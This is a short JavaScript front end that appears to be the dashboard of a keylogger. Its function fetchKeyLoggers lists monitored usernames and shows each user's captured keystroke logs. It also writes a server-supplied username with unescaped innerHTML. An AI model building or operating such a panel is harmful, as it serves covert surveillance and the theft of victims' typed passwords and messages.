
$("#mySidenav").on('click','a',function(e){
  e.preventDefault();
  const xhttp = new XMLHttpRequest();
  console.log(xhttp.status);
  xhttp.onload = function() {
    var res=JSON.parse(JSON.parse(this.responseText));
  
    //document.getElementsByClassName("content")[0].innerHTML=res;
    document.getElementById("username").innerHTML=res[0].username.toString();
    const element = document.getElementById("keys");
    element.textContent='';
    var array=res[0].text;
    for(var i=0;i<array.length;i++){
      var user = document.createElement("p");
      var node = document.createTextNode(array[i].keys);
      user.appendChild(node);
      user.setAttribute('style','word-break: break-word')
      element.appendChild(user);
      element.appendChild(document.createElement('br'));
    }
  
    //document.getElementById("text").innerHTML=res[0].text.toString();
  }
  xhttp.open("GET",e.target.href);
  xhttp.send();
})


window.onload=function fetchKeyLoggers() {
  const xhttp = new XMLHttpRequest();
  xhttp.onload = function() {
    var array=JSON.parse(this.responseText);
    const element = document.getElementById("mySidenav");
   
    for(var i=0;i<array.length;i++){
      var user = document.createElement("a");
      var node = document.createTextNode(array[i].username);
      user.appendChild(node);
      user.setAttribute('href',"/user/logs/"+array[i].username);
      user.setAttribute('class',"w3-bar-item w3-button");
      element.appendChild(user);
      element.appendChild(document.createElement('br'));
    }
  
  }
  xhttp.open("GET", "/users");
  xhttp.send();
}